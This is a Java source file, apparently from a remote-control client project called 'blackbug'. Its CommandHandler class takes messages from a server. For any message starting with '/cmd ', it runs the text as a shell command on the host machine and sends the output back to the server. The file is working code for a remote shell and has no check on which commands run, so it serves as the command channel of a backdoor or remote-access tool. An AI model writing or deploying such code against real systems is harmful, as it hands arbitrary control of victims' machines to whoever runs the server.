package pers.adlered.blackbug.client.connection;

import pers.adlered.blackbug.client.Values;
import pers.adlered.blackbug.client.tools.Shell;

public class CommandHandler extends Thread {
    private String command = "";

    public CommandHandler(String command) {
        this.command = command;
    }

    @Override
    public void run() {
        System.out.println("[Server] " + command);
        if (command.startsWith("Hello")) {
            int UID = Integer.parseInt(command.replaceAll("Hello! Your UID is: UID-", ""));
            System.out.println("Server accepted your connection and your UID is UID-" + UID);
        }
        if (command.startsWith("/cmd ")) {
            String command = this.command.replaceAll("/cmd ", "");
            System.out.println("Executing command " + command);
            String result = "";
            if (Values.OS.equals("macOS") || Values.OS.equals("Linux")) {
                result = Shell.unix(command, null);
            } else if (Values.OS.equals("Windows")) {
                result = Shell.windows(command);
            }
            result += ":: EOF ::\r\n";
            System.out.println(result);
            Sender.send(result);
        }
    }
}
